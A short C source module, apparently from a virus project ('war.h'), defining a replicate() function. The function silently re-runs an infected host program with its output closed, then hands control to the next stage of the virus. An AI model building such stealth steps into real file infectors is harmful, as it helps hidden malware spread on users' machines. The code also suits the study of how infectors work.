#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void replicate(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{

#if LOGGER
	EXIT_LOGGER("replicate:\t\t");
#endif

	if (context == FAILURE)
		goto label;

	pid_t child;
	char *av[] = {host->filename, NULL};

	if ((child = _fork()) < 0)
	{
		context = FAILURE;
		goto label;
	}

	if (child == 0)
	{
		_close(STDIN_FILENO);
		_close(STDOUT_FILENO);
		_close(STDERR_FILENO);

		_execve(av[0], av, NULL);
		_fatal();
	}
	else
		_wait4(child, NULL, WSTOPPED, NULL);

label:
	execution(host, keychain, context);
}
